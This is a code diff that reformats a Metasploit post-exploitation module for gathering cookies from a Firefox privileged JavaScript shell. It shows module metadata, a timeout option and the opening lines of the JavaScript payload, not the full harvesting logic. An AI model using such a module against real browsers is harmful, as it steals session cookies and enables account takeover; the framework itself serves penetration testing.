@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,23 +8,21 @@ require 'json'
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Firefox Gather Cookies from Privileged Javascript Shell',
-      'Description'   => %q{
-        This module allows collection of cookies from a Firefox Privileged Javascript Shell.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'DisclosureDate' => 'Mar 26 2014'
-    ))
+                      'Name'          => 'Firefox Gather Cookies from Privileged Javascript Shell',
+                      'Description'   => %q(
+                        This module allows collection of cookies from a Firefox Privileged Javascript Shell.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'joev' ],
+                      'DisclosureDate' => 'Mar 26 2014'))
 
     register_options([
-      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
-    ], self.class)
+                       OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
+                     ], self.class)
   end
 
   def run
@@ -44,7 +43,7 @@ class MetasploitModule < Msf::Post
   end
 
   def js_payload
-    %Q|
+    %|
       (function(send){
         try {
           var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
